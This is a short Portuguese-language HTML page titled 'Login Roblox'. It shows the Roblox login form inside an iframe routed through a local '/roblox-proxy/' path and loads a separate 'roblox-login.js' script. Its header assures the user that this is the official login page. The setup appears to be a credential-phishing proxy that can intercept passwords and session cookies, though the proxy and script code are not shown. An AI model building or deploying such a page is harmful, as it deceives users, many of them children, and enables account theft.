<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login Roblox</title>
<style>
  html,body{margin:0;height:100%;background:#0b0d10;color:#e8eaed;font:14px/1.45 system-ui,sans-serif;overflow:hidden}
  main{height:100%;display:flex;flex-direction:column}header{padding:10px 16px;background:#171a1f;border-bottom:1px solid #2b3038}
  strong{font-size:16px}#status{margin-left:12px;color:#9fb0c3;font-size:12px}
  iframe{display:block;width:100%;height:100%;border:0;flex:1;background:#fff}
</style>
</head>
<body>
<main>
  <header><strong>Login Roblox</strong><span id="status">Conclua o login na página oficial abaixo.</span></header>
  <iframe src="/roblox-proxy/www.roblox.com/pt/login" title="Login oficial da Roblox" referrerpolicy="no-referrer"></iframe>
</main>
<script src="/roblox-login.js"></script>
</body>
</html>
